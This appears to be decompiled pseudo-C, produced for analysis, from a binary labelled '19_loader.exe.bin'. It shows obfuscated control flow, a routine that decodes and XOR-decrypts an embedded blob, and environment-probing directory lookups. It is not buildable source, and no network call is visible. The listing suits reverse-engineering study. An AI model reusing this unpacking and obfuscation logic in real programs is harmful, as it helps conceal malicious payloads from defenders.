                    /* WARNING: Switch is manually overridden */
  switch(*(undefined4 *)(&UNK_14008b004 + lVar17)) {
  case 0x799:
    goto override_jmp_140001f89_case_0;
  case 0xfffffe56:
    puVar16 = *(uint **)(puStack_98 + 0x24);
    puVar19 = &UNK_14008b054;
    if (puVar16 == (uint *)0x0) {
      puVar19 = &UNK_14008b00c;
    }
  }
  uStack_b8 = uStack_80;
  uStack_c4 = uStack_90;
  puVar8 = puStack_88;
  puVar6 = puStack_98;
                    /* WARNING: Switch is manually overridden */
  switch(*puVar19) {
  case 0xfffffee5:
    goto override_jmp_140001753_case_0;
  }
  goto override_jmp_140001753_case_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x2164 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140002164 rva=0x2164 */

void FUN_140002164(undefined8 *param_1,ulonglong param_2,byte param_3,longlong param_4,
                  ulonglong param_5)

{
  undefined1 auVar1 [16];
  undefined1 auVar2 [16];
  ulonglong uVar3;
  longlong lVar4;
  LPVOID pvVar5;
  undefined8 uVar6;
  
  auVar1._8_8_ = 0;
  auVar1._0_8_ = param_2;
  auVar2._8_8_ = 0;
  auVar2._0_8_ = param_5;
  uVar3 = SUB168(auVar1 * auVar2,0);
  uVar6 = 1;
  if (0x8000000000000000U - param_4 < uVar3 || SUB168(auVar1 * auVar2,8) != 0) {
    lVar4 = 8;
  }
  else {
    if (uVar3 != 0) {
      pvVar5 = FUN_14000fc7a((uint)param_3 << 3,uVar3);
      if (pvVar5 == (LPVOID)0x0) {
        param_1[1] = param_4;
        lVar4 = 0x10;
      }
      else {
        param_1[1] = pvVar5;
        lVar4 = 0x10;
        uVar6 = 0;
        uVar3 = param_2;
      }
      goto LAB_1400021ed;
    }
    param_1[1] = param_4;
    lVar4 = 0x10;
    uVar6 = 0;
  }
  uVar3 = 0;
LAB_1400021ed:
  *(ulonglong *)((longlong)param_1 + lVar4) = uVar3;
  *param_1 = uVar6;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x2200 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140002200 rva=0x2200 */

void FUN_140002200(longlong *param_1,undefined8 *param_2,undefined8 *param_3)

{
  code *pcVar1;
  longlong lVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  
  uVar3 = (ulonglong)((longlong)param_3 - (longlong)param_2) >> 1;
  uVar4 = param_1[2];
  if (param_1[1] - uVar4 < uVar3) {
    lVar2 = FUN_140013790(param_1,uVar4,uVar3,(LPVOID)0x2,2);
    if (lVar2 != -1) {
                    /* WARNING: Does not return */
      pcVar1 = (code *)invalidInstructionException();
      (*pcVar1)();
    }
    uVar4 = param_1[2];
  }
  else if (param_3 == param_2) goto LAB_140002244;
  FUN_140021f30((undefined8 *)(uVar4 * 2 + *param_1),param_2,(longlong)param_3 - (longlong)param_2);
LAB_140002244:
  param_1[2] = uVar4 + uVar3;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x2282 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140002282 rva=0x2282 */

void FUN_140002282(longlong param_1,longlong param_2,undefined4 param_3,undefined8 param_4,
                  undefined8 param_5)

{
  undefined8 *puVar1;
  ushort uVar2;
  longlong lVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  
  uVar2 = *(ushort *)(param_2 + 0x98);
  uVar5 = (ulonglong)uVar2;
  uVar4 = param_1 + 1;
  puVar1 = (undefined8 *)(param_2 + param_1 * 4);
  if (uVar5 < uVar4) {
    *(undefined4 *)puVar1 = param_3;
  }
  else {
    FUN_140021f30((undefined8 *)(param_2 + uVar4 * 4),puVar1,(uVar5 - param_1) * 4);
    *(undefined4 *)(param_2 + param_1 * 4) = param_3;
    FUN_140021f30((undefined8 *)(param_2 + uVar4 * 8 + 0x30),
                  (undefined8 *)(param_2 + param_1 * 8 + 0x30),(uVar5 - param_1) * 8);
  }
  *(undefined8 *)(param_2 + 0x30 + param_1 * 8) = param_4;
  if (param_1 + 2U < uVar5 + 2) {
    FUN_140021f30((undefined8 *)(param_2 + 0xa0 + (param_1 + 2U) * 8),
                  (undefined8 *)(param_2 + 0xa0 + uVar4 * 8),(uVar5 - param_1) * 8);
  }
  *(undefined8 *)(param_2 + 0xa8 + param_1 * 8) = param_5;
  *(ushort *)(param_2 + 0x98) = uVar2 + 1;
  if (uVar4 < uVar5 + 2) {
    uVar4 = param_1 - 1;
    do {
      lVar3 = *(longlong *)(param_2 + 0xb0 + uVar4 * 8);
      *(longlong *)(lVar3 + 0x90) = param_2;
      *(short *)(lVar3 + 0x88) = (short)uVar4 + 2;
      uVar4 = uVar4 + 1;
    } while (uVar5 != uVar4);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x237c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14000237c rva=0x237c */

undefined8 FUN_14000237c(void)

{
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x237f | partial_markers_remain ===== */
/* address=14000237f rva=0x237f */

void thunk_FUN_140005286(void)

{
  LPVOID pvVar1;
  int *piVar2;
  
  FUN_140011d10();
  pvVar1 = FUN_14000fc7a(0,0x2e);
  piVar2 = &DAT_14008a970;
  if (pvVar1 == (LPVOID)0x0) {
    piVar2 = &DAT_14008a940;
  }
                    /* WARNING: Could not recover jumptable at 0x0001400053e5. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)(&LAB_14000593b + *piVar2))();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x2384 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140002384 rva=0x2384 */

ulonglong FUN_140002384(uint param_1)

{
  longlong lVar1;
  longlong lVar2;
  uint uVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  uint uVar6;
  ulonglong uVar7;
  
  uVar4 = 0x21;
  lVar1 = 0;
  do {
    lVar2 = lVar1 + (uVar4 >> 1);
    if (param_1 < ((&DAT_140088a20)[lVar2] & 0x1fffff)) {
      lVar2 = lVar1;
    }
    uVar4 = uVar4 - (uVar4 >> 1);
    lVar1 = lVar2;
  } while (1 < uVar4);
  uVar7 = (ulonglong)((&DAT_140088a20)[lVar2] * 0x800 == param_1 * 0x800) + lVar2 +
          (ulonglong)((uint)((&DAT_140088a20)[lVar2] * 0x800) < param_1 * 0x800);
  uVar4 = (ulonglong)((uint)(&DAT_140088a20)[uVar7] >> 0x15);
  uVar5 = 0x30b;
  if ((uVar7 < 0x20) &&
     (uVar5 = (ulonglong)(*(uint *)(&DAT_140088a24 + uVar7 * 4) >> 0x15), uVar7 == 0)) {
    uVar3 = 0;
  }
  else {
    uVar3 = *(uint *)(&DAT_140088a1c + uVar7 * 4) & 0x1fffff;
  }
  if (~uVar4 + uVar5 != 0) {
    uVar6 = 0;
    do {
      uVar6 = (byte)"2lrqlqmri33bzsg83d2abzdt5tymz0785rzlxp3824si4ixf1nz4iqg4gqmapnf1rvzikpl6li6zlbns26lbkb0rz0y78zaf2wakqbaompdC:\\Program Files\\ventriloquists\\cluishoond.txt"
                    [uVar4 + 0x99] + uVar6;
      if (param_1 - uVar3 < uVar6) break;
      uVar4 = uVar4 + 1;
    } while (uVar4 != uVar5 - 1);
  }
  return uVar4 & 0xffffffffffffff01;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x243f | no_partial_markers_not_a_CFG_proof ===== */
/* address=14000243f rva=0x243f */

bool FUN_14000243f(HANDLE param_1,FILE_INFO_BY_HANDLE_CLASS param_2,LPVOID param_3)

{
  BOOL BVar1;
  
  BVar1 = SetFileInformationByHandle(param_1,param_2,param_3,8);
  if (BVar1 == 0) {
    GetLastError();
  }
  return BVar1 == 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x246e | no_partial_markers_not_a_CFG_proof ===== */
/* address=14000246e rva=0x246e */

uint FUN_14000246e(uint param_1)

{
  return param_1 >> 0x1f;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x2474 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140002474 rva=0x2474 */

undefined8 FUN_140002474(HANDLE param_1,void *param_2,DWORD param_3)

{
  BOOL BVar1;
  undefined8 uVar2;
  DWORD local_4;
  
  local_4 = 0;
  BVar1 = WriteConsoleW(param_1,param_2,param_3,&local_4,(LPVOID)0x0);
  if (BVar1 == 0) {
    GetLastError();
    if ((undefined **)PTR_PTR_1400dfa90 != &PTR_LAB_1400886d0) {
      PTR_PTR_1400dfa90 = (undefined *)&PTR_LAB_1400886d0;
    }
    uVar2 = 1;
  }
  else {
    uVar2 = 0;
  }
  return uVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x24d6 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400024d6 rva=0x24d6 */

void FUN_1400024d6(undefined8 *param_1,ulonglong param_2)

{
  code *pcVar1;
  ulonglong uVar2;
  undefined8 uVar3;
  bool bVar4;
  byte *pbVar5;
  ushort *puVar6;
  ulonglong uVar7;
  byte bVar8;
  undefined8 local_30;
  undefined8 uStack_28;
  undefined8 uStack_20;
  
  if ((param_2 & 1) == 0) {
    uVar2 = 0;
    bVar8 = 7;
    bVar4 = false;
    pbVar5 = &DAT_14008907e;
    do {
      puVar6 = (ushort *)(pbVar5 + 1);
      if ((char)bVar8 < '\0') {
        if (SBORROW1('\0',bVar8)) {
          pbVar5 = (byte *)((longlong)puVar6 + (ulonglong)*puVar6 + 2);
          uVar2 = uVar2 + *puVar6;
        }
        else {
          bVar4 = (bool)(bVar4 | uVar2 == 0);
          pbVar5 = (byte *)((longlong)puVar6 +
                           (ulonglong)((byte)((bVar8 & 2) << 5 | bVar8 << 7) >> 5) +
                           (ulonglong)(bVar8 >> 2 & 2) + (ulonglong)(bVar8 >> 1 & 2));
        }
      }
      else {
        pbVar5 = (byte *)((longlong)puVar6 + (ulonglong)bVar8);
        uVar2 = uVar2 + bVar8;
      }
      bVar8 = *pbVar5;
    } while (bVar8 != 0);
    uVar7 = 0;
    if (0xf < uVar2) {
      uVar7 = uVar2 * 2;
    }
    if (!bVar4) {
      uVar7 = uVar2 * 2;
    }
  }
  else {
    uVar7 = param_2 >> 1;
  }
  FUN_140002164(&local_30,uVar7,0,1,1);
  if ((char)local_30 == '\0') {
    local_30 = uStack_28;
    uStack_28 = uStack_20;
    uStack_20 = 0;
    uVar3 = FUN_140010a2f(&local_30,0x140088890,param_2,(ushort *)&DAT_14008907e);
    if ((char)uVar3 == '\0') {
      param_1[2] = uStack_20;
      *param_1 = local_30;
      param_1[1] = uStack_28;
      return;
    }
  }
                    /* WARNING: Does not return */
  pcVar1 = (code *)invalidInstructionException();
  (*pcVar1)();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x260b | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

void FUN_14000260b(LPVOID param_1,ulonglong param_2)

{
  HANDLE hHeap;
  
  if (0x10 < param_2) {
    param_1 = *(LPVOID *)((longlong)param_1 + -8);
  }
  hHeap = GetProcessHeap();
  HeapFree(hHeap,0,param_1);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x2637 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140002637 rva=0x2637 */

undefined1 FUN_140002637(void)

{
  return 0x2b;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x263a | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000263a(void)

{
  undefined8 *puVar1;
  ulonglong *puVar2;
  undefined1 uVar3;
  undefined1 uVar4;
  undefined1 uVar5;
  undefined1 uVar6;
  undefined2 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined8 uVar13;
  undefined8 uVar14;
  undefined8 uVar15;
  undefined8 uVar16;
  undefined8 uVar17;
  undefined8 uVar18;
  undefined8 uVar19;
  undefined8 uVar20;
  code *pcVar21;
  byte bVar22;
  UINT UVar23;
  DWORD DVar24;
  undefined8 *puVar25;
  undefined8 *puVar26;
  byte *pbVar27;
  ulonglong uVar28;
  uint uVar29;
  undefined8 *in_RCX;
  undefined4 *puVar30;
  byte bVar31;
  undefined4 *in_RDX;
  uint uVar32;
  uint uVar33;
  ulonglong uVar34;
  int iVar35;
  longlong lVar36;
  ulonglong uVar37;
  ulonglong uVar38;
  longlong lVar39;
  uint uVar40;
  int iVar41;
  ulonglong uVar42;
  byte *pbVar43;
  ulonglong uVar44;
  uint uVar45;
  uint uVar46;
  byte bVar47;
  uint uVar48;
  bool bVar49;
  bool bVar50;
  ulonglong uStack_4b0;
  undefined8 *local_498;
  ulonglong uStack_480;
  int iStack_444;
  ulonglong uStack_440;
  byte *pbStack_408;
  ulonglong uStack_400;
  ulonglong uStack_3f8;
  undefined6 uStack_3f0;
  undefined2 uStack_3ea;
  undefined6 uStack_3e8;
  undefined8 uStack_3e2;
  undefined4 *local_3d0;
  undefined8 uStack_3c8;
  undefined7 uStack_3c0;
  undefined1 uStack_3b9;
  undefined7 uStack_3b8;
  undefined8 *local_3a8;
  longlong local_3a0;
  longlong local_398;
  longlong local_390;
  byte local_388 [80];
  undefined8 uStack_338;
  undefined7 uStack_330;
  undefined1 uStack_329;
  undefined7 uStack_328;
  undefined8 uStack_318;
  undefined8 uStack_310;
  undefined8 *local_300;
  ulonglong uStack_2f8;
  ulonglong uStack_2f0;
  byte local_140 [256];
  
  lVar39 = *(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8);
  local_3d0 = in_RDX;
  local_3a8 = in_RCX;
  FUN_140011d10();
  uVar28 = DAT_1400df2f8;
  local_398 = 0x7f01f150478c4fdf;
  local_3a0 = 0x73;
  local_390 = -0x5d63123d1cc30331;
  local_300 = (undefined8 *)0xbae2d64dd63a3919;
  FUN_14001010c(local_388,0xbae2d64dd63a3919);
  uVar34 = 0;
  FUN_1400225e0((undefined1 (*) [32])local_140,0,0x100);
  do {
    local_140[local_388[uVar34]] = (byte)uVar34;
    uVar34 = uVar34 + 1;
    puVar30 = &UNK_14008b270;
    if ((byte)(((byte)*(undefined8 *)
                       (*(longlong *)
                         ((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0xb0) ^
               0xa5) + 0xb9) != uVar34) {
      puVar30 = &UNK_14008b21c;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar30) {
    case 0xf14:
      goto override_jmp_14000277c_case_1;
    case 0xfffffc83:
    }
  } while( true );
override_jmp_14000277c_case_1:
  pbVar27 = FUN_14000fc7a(0,300);
                    /* WARNING: Switch is manually overridden */
  switch(pbVar27 == (byte *)0x0) {
  case true:
                    /* WARNING: Does not return */
    pcVar21 = (code *)invalidInstructionException();
    (*pcVar21)();
  }
  uStack_400 = 300;
  uStack_3f8 = 0;
  uVar33 = (uint)uVar28;
  uStack_4b0 = 0;
  uVar44 = 0;
  uVar46 = 0;
  uVar32 = 0;
  uVar34 = 0;
  pbStack_408 = pbVar27;
                    /* WARNING: Switch is manually overridden */
  switch(uVar33 != 0xbd88985b) {
  case true:
override_jmp_1400029c3_case_0:
    do {
      uVar37 = uVar34 + 1;
      lVar36 = 0x84;
      if (uVar44 == (uVar33 ^ 0xbd889651)) {
        lVar36 = 0x114;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008b1a8 + lVar36)) {
      case 0xc23:
        uVar44 = uVar44 + 1;
        uVar46 = (uint)local_140[(byte)(&UNK_140088c2b)[uVar34]] | uVar46 << 5;
        lVar36 = 0xf0;
        if ((uVar33 ^ 0xbd88967e) < uVar32) {
          lVar36 = 0x9c;
        }
        break;
      case 0xfffffe8f:
        uVar44 = 0;
        uVar34 = uVar37;
                    /* WARNING: Switch is manually overridden */
        switch(uVar37 != 0xbd88985b - uVar33) {
        case false:
          goto override_jmp_1400029c3_case_1;
        }
        goto override_jmp_1400029c3_case_0;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008b1a8 + lVar36)) {
      case 0xfffffddd:
        uVar32 = uVar32 - 3;
        puVar30 = (undefined4 *)&UNK_14008b26c;
        if (uStack_4b0 == uStack_400) {
          puVar30 = (undefined4 *)&UNK_14008b254;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar30) {
        case 0xffffffe4:
          FUN_1400012c4(&pbStack_408);
          pbVar27 = pbStack_408;
        }
        pbVar27[uStack_4b0] = (byte)(uVar46 >> ((byte)uVar32 & 0x1f));
        uStack_4b0 = uStack_4b0 + 1;
        uVar46 = uVar46 & ~(-1 << ((byte)uVar32 & 0x1f));
        uVar34 = uVar37;
        uStack_3f8 = uStack_4b0;
                    /* WARNING: Switch is manually overridden */
        switch(uVar37 != 0xbd88985b - uVar33) {
        case false:
          goto override_jmp_1400029c3_case_1;
        }
        goto override_jmp_1400029c3_case_0;
      }
      uVar32 = uVar32 + 5;
      uVar34 = uVar37;
                    /* WARNING: Switch is manually overridden */
      switch(uVar37 != 0xbd88985b - uVar33) {
      case false:
        goto override_jmp_1400029c3_case_1;
      }
    } while( true );
  }
override_jmp_1400029c3_case_1:
  uVar34 = uStack_400;
  pbVar27 = pbStack_408;
  uVar37 = 0x6b0b0a2c6f7d51e1;
  uVar44 = 0;
  bVar31 = 0;
  pbVar43 = pbStack_408;
                    /* WARNING: Switch is manually overridden */
  switch(*(undefined4 *)(&UNK_14008b220 + (ulonglong)(uStack_4b0 != 0) * 4)) {
  case 0xfc:
    do {
      puVar30 = (undefined4 *)&UNK_14008b1f4;
      if ((bVar31 & 7) == 0) {
        puVar30 = (undefined4 *)&UNK_14008b2c8;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar30) {
      case 0xffffff2d:
        uVar37 = uVar37 + 0xb2041bff18f368b;
        uVar44 = (uVar37 >> 0x18 ^ uVar37) * -0x39fe3ad90b195fd;
        uVar44 = (uVar28 ^ 0x31ede2dc22e85c4b) * (uVar44 >> 0x1a ^ uVar44);
        uVar44 = uVar44 >> 0x18 ^ uVar44;
      }
      *pbVar43 = *pbVar43 ^
                 (byte)(uVar44 >> ((bVar31 & 7) << (((byte)uVar28 ^ 0x7f) & 0x3f) & 0x3f));
      bVar31 = bVar31 + 1;
      pbVar43 = pbVar43 + 1;
                    /* WARNING: Switch is manually overridden */
      switch(pbVar43 != pbStack_408 + uStack_4b0) {
      case false:
        goto override_jmp_140002a28_case_1;
      }
    } while( true );
  case 0x119a:
    if (*(int *)(lVar39 + 0x90) == 0x7a3b50a) {
      UVar23 = GetWindowsDirectoryW((LPWSTR)&local_300,0xc2);
      if (UVar23 - 1 < 0xc1) {
        DVar24 = GetTempPathW(0xa8,(LPWSTR)&local_300);
        if (((DVar24 - 1 < 0xa7) &&
            (UVar23 = GetSystemDirectoryW((LPWSTR)&local_300,0x88), UVar23 - 1 < 0x87)) &&
           (DVar24 = GetCurrentDirectoryW(0xde,(LPWSTR)&local_300), DVar24 - 1 < 0xdd)) {
          GetModuleHandleW((LPCWSTR)0x0);
                    /* WARNING: Switch is manually overridden */
        }
      }
    }
  }
  goto override_jmp_14000307b_case_1;
override_jmp_140002a28_case_1:
                    /* WARNING: Switch is manually overridden */
  switch(*(undefined4 *)(&UNK_14008b1ec + (ulonglong)(uStack_4b0 == 0) * 4)) {
  case 0x3de:
    bVar31 = *pbStack_408;
    uVar28 = 0;
    uVar32 = 1;
    puVar30 = (undefined4 *)&UNK_14008b29c;
    if (uStack_4b0 == 0) {
      puVar30 = (undefined4 *)&UNK_14008b1a8;
    }
    bVar49 = false;
    uVar44 = 0;
    uVar46 = 1;
    iVar35 = 0;
                    /* WARNING: Switch is manually overridden */
    switch(*puVar30) {
    case 0x1064:
      goto override_jmp_140002f2a_case_1;
    }
override_jmp_140002f2a_case_0:
    iVar35 = iVar35 * 2;
    puVar30 = (undefined4 *)&UNK_14008b25c;
    if (bVar49) {
      puVar30 = (undefined4 *)&UNK_14008b238;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar30) {
    case 0xf3c:
override_jmp_140003352_case_0:
      uVar48 = -uVar33 + 0xbd88967f;
      bVar47 = (byte)uVar48;
      iVar41 = -uVar33 + -0x4277697c;
      uVar32 = iVar41 + (iVar35 << (bVar47 & 0x1f) ^ 8U);
      lVar39 = 0x14;
      if (uVar32 == (uVar48 ^ 3)) {
        lVar39 = 0x48;
      }
      break;
    case 0x115c:
      do {
        puVar30 = (undefined4 *)&UNK_14008b1a8;
        if (uVar44 < uStack_4b0) {
          puVar30 = (undefined4 *)&UNK_14008b29c;
        }
        bVar49 = true;
                    /* WARNING: Switch is manually overridden */
        switch(*puVar30) {
        case 0x821:
          goto override_jmp_140002f2a_case_0;
        case 0x1064:
override_jmp_140002f2a_case_1:
          pbVar43 = pbStack_408 + uVar44;
          iVar41 = uVar32 + 1;
          bVar50 = iVar41 == -0x4277697c - uVar33;
          uVar46 = (-iVar41 & -(uint)bVar50) + iVar41;
          uVar37 = -(ulonglong)bVar50;
          uVar28 = uVar28 ^ (uVar44 + 1 ^ uVar28) & uVar37;
          uVar44 = uVar44 + ((uVar44 + 1) - uVar44 & uVar37);
          puVar30 = (undefined4 *)&UNK_14008b25c;
          if (bVar49) {
            puVar30 = (undefined4 *)&UNK_14008b238;
          }
          iVar35 = (uint)((*pbVar43 >> (uVar32 & 7) & 1) != 0) + iVar35 * 2;
          uVar32 = uVar46;
                    /* WARNING: Switch is manually overridden */
          switch(*puVar30) {
          case 0xf3c:
            goto override_jmp_140003352_case_0;
          }
        }
      } while( true );
    }
    uVar48 = 0;
    uVar29 = 0;
    uVar44 = uVar28;
    uVar45 = uVar46;
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
    case 0x130:
override_jmp_140002802_case_0:
      do {
        uVar29 = uVar29 + 1;
        uVar48 = uVar48 * 2;
        puVar30 = (undefined4 *)&UNK_14008b290;
        if (uVar44 < uStack_4b0) {
          puVar30 = (undefined4 *)&UNK_14008b2d4;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar30) {
        case 0x2be:
          bVar49 = uVar45 + 1 == uVar33 + 0x4277698c;
          uVar46 = 0;
          if (!bVar49) {
            uVar46 = uVar45 + 1;
          }
          uVar28 = (uVar44 + 1 ^ uVar28) & -(ulonglong)bVar49 ^ uVar28;
          uVar40 = (uint)((pbStack_408[uVar44] >> (uVar45 & 7) & 1) != 0);
          uVar45 = uVar46;
                    /* WARNING: Switch is manually overridden */
          switch(!bVar49) {
          case false:
            uVar48 = uVar48 | uVar40;
            puVar30 = (undefined4 *)&UNK_14008b1bc;
            if (uVar29 == uVar32) {
              puVar30 = (undefined4 *)&UNK_14008b234;
            }
            uVar44 = uVar44 + 1;
                    /* WARNING: Switch is manually overridden */
            switch(*puVar30) {
            case 0x1127:
              goto override_jmp_140002802_case_1;
            }
            break;
          case true:
            uVar48 = uVar48 | uVar40;
            puVar30 = (undefined4 *)&UNK_14008b1bc;
            if (uVar29 == uVar32) {
              puVar30 = (undefined4 *)&UNK_14008b234;
            }
                    /* WARNING: Switch is manually overridden */
            switch(*puVar30) {
            case 0x1127:
              goto override_jmp_140002802_case_1;
            }
          }
          goto override_jmp_140002802_case_0;
        case 0x110a:
          puVar30 = (undefined4 *)&UNK_14008b1bc;
          if (uVar29 == uVar32) {
            puVar30 = (undefined4 *)&UNK_14008b234;
          }
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar30) {
        case 0x1127:
          goto override_jmp_140002802_case_1;
        }
      } while( true );
    }
  }
  goto override_jmp_14000307b_case_1;
override_jmp_140002bba_case_1:
  lVar39 = 0xa0;
  if (uStack_480 == uStack_2f8) {
    lVar39 = 0xb8;
  }
                    /* WARNING: Switch is manually overridden */
  switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
  case 0xfffffd89:
    FUN_1400012c4(&local_300);
    local_498 = local_300;
                    /* WARNING: Switch is manually overridden */
  }
  *(byte *)((longlong)local_498 + uStack_480) = bVar31;
  uStack_480 = uStack_480 + 1;
  puVar30 = (undefined4 *)&UNK_14008b214;
  if (uStack_480 < uVar37) {
    puVar30 = (undefined4 *)&UNK_14008b28c;
  }
  uStack_2f0 = uStack_480;
                    /* WARNING: Switch is manually overridden */
  switch(*puVar30) {
  case 0x19e:
    do {
      uVar44 = uVar28;
                    /* WARNING: Switch is manually overridden */
      switch(uStack_4b0 <= uVar28) {
      case false:
        goto override_jmp_140002cd5_case_0;
      case true:
override_jmp_140002cd5_case_1:
        puVar30 = (undefined4 *)&UNK_14008b23c;
        if (uVar44 < uStack_4b0) {
          puVar30 = (undefined4 *)&UNK_14008b1c8;
        }
        iVar35 = 5;
        uVar32 = 0;
        uVar28 = uVar44;
        uVar48 = uVar46;
                    /* WARNING: Switch is manually overridden */
        switch(*puVar30) {
        case 0x1143:
          goto override_jmp_1400036f2_case_1;
        }
override_jmp_1400036f2_case_0:
        uVar32 = uVar32 * 2;
        lVar39 = 0xc0;
                    /* WARNING: Switch is manually overridden */
        if (iVar35 == 0) {
          lVar39 = 0x98;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
        case 0xc63:
override_jmp_14000299f_case_0:
          uVar46 = uVar48;
          lVar39 = 0x18;
          if (uVar44 < uStack_4b0) {
            lVar39 = 0xd0;
          }
          uVar48 = 0;
          uVar28 = uVar44;
          uVar45 = uVar46;
          iVar35 = iStack_444;
                    /* WARNING: Switch is manually overridden */
          switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
          case 0x154:
            goto override_jmp_14000281e_case_1;
          }
          break;
        case 0x120e:
          do {
            iVar35 = iVar35 + -1;
            puVar30 = (undefined4 *)&UNK_14008b1c8;
            if (uStack_4b0 <= uVar28) {
              puVar30 = (undefined4 *)&UNK_14008b23c;
            }
                    /* WARNING: Switch is manually overridden */
            switch(*puVar30) {
            case 0x1143:
override_jmp_1400036f2_case_1:
              uVar48 = uVar46 + 1;
              uVar45 = uVar46 & 7;
              bVar49 = uVar48 == 0xbd889684 - uVar33;
                    /* WARNING: Switch is manually overridden */
              if (bVar49) {
                uVar44 = uVar28 + 1;
              }
              uVar46 = uVar48 & -(uint)bVar49 ^ uVar48;
              uVar32 = (uint)((pbVar27[uVar28] >> uVar45 & 1) != 0) | uVar32 * 2;
              uVar28 = uVar28 ^ (uVar28 + 1 ^ uVar28) & -(ulonglong)bVar49;
              lVar39 = 0xc0;
              if (iVar35 == 0) {
                lVar39 = 0x98;
              }
              uVar48 = uVar46;
                    /* WARNING: Switch is manually overridden */
              switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
              case 0xc63:
                goto override_jmp_14000299f_case_0;
              }
              break;
            case 0xfffffe2c:
              goto override_jmp_1400036f2_case_0;
            }
          } while( true );
        }
override_jmp_14000281e_case_0:
        uVar48 = uVar48 * 2 |
                 (uint)((pbVar27[uVar44] >> (0xbd889683 - uVar33 & uVar45 & 0x1f) & 1) != 0);
        uVar38 = uVar44 + 1;
        uVar46 = uVar45 + 1;
                    /* WARNING: Switch is manually overridden */
        if (uVar45 + 1 == 8) {
          uVar44 = uVar38;
          uVar46 = 0;
          uVar28 = uVar38;
        }
        lVar39 = 0x10;
        if (iVar35 == 0) {
          lVar39 = 0x38;
        }
        uVar45 = uVar46;
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)(&UNK_14008b1a8 + lVar39)) {
        case 0x865:
override_jmp_140003a24_case_1:
          if (uVar32 == 0x3f) {
            uStack_440 = 0x42;
            iVar35 = 7;
            uVar32 = 0;
            puVar30 = (undefined4 *)&UNK_14008b2cc;
            if (uStack_4b0 <= uVar28) {
              puVar30 = (undefined4 *)&UNK_14008b280;
            }
            uVar44 = uVar28;
            uVar38 = uVar28;
                    /* WARNING: Switch is manually overridden */
            switch(*puVar30) {
            case 0x7b2:
              goto override_jmp_140002793_case_1;
            }
override_jmp_140002793_case_0:
            do {
              puVar30 = (undefined4 *)&UNK_14008b24c;
              bVar49 = iVar35 == 0;
              iVar35 = iVar35 + -1;
              if (bVar49) {
                puVar30 = (undefined4 *)&UNK_14008b258;
              }
                    /* WARNING: Switch is manually overridden */
              switch(*puVar30) {
              case 0xd2:
                goto override_jmp_140002979_case_1;
              }
override_jmp_140002979_case_0:
              uVar32 = uVar32 * 2;
              puVar30 = (undefined4 *)&UNK_14008b2cc;
              if (uStack_4b0 <= uVar44) {
                puVar30 = (undefined4 *)&UNK_14008b280;
              }
              uVar38 = uVar44;
                    /* WARNING: Switch is manually overridden */
              switch(*puVar30) {
              case 0x7b2:
override_jmp_140002793_case_1:
                do {
                  uVar45 = uVar46 + 1;
                  uVar29 = uVar46 & 7;
                  bVar49 = uVar45 == (uVar33 ^ 0xbd889674);
                  uVar44 = uVar38 + 1;
                  puVar30 = (undefined4 *)&UNK_14008b2d0;
                  if (bVar49) {
                    puVar30 = (undefined4 *)&UNK_14008b284;
                  }
                  uVar46 = uVar45 & -(uint)bVar49 ^ uVar45;
